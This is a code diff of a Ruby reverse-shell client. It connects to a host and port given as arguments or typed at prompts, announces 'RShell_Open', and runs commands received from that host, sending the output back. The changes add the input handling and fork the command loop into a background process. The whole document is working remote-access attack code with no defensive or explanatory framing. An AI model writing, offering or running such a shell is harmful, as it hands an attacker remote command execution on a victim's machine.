@@ -1,19 +1,32 @@
 require "socket"
 
+if ARGV[0] && ARGV[1]
 host = ARGV[0]
 port = ARGV[1].to_i
+else
+print "Host: "
+host = gets.chomp
+print "Port: "
+port = gets.chomp.to_i
+end
+
+
+
 host = TCPSocket.open(host, port)
 host.puts "RShell_Open"
 
-	if system("pwd")
-		currentDirCommand = "pwd"
-		joiner = "\; "
-	elsif system("cd")
-		currentDirCommand = "cd"
-		joiner = "\& "
-	end
-	currentDir = `#{currentDirCommand}`.chomp
-	host.puts currentDirCommand
+begin
+	`pwd`
+	currentDirCommand = "pwd"
+	joiner = "\; "
+rescue
+	`cd`
+	currentDirCommand = "cd"
+	joiner = "\& "
+end
+host.puts currentDirCommand
+
+fork do
 	loop do
 		cmd = host.gets.chomp
 		if cmd.downcase == "exit"
@@ -33,3 +46,9 @@ host.puts "RShell_Open"
 			host.puts out.gsub("\n", "\\NEWLINE")
 		end
 	end
+end
+
+
+
+
+# Process.detach(pid)
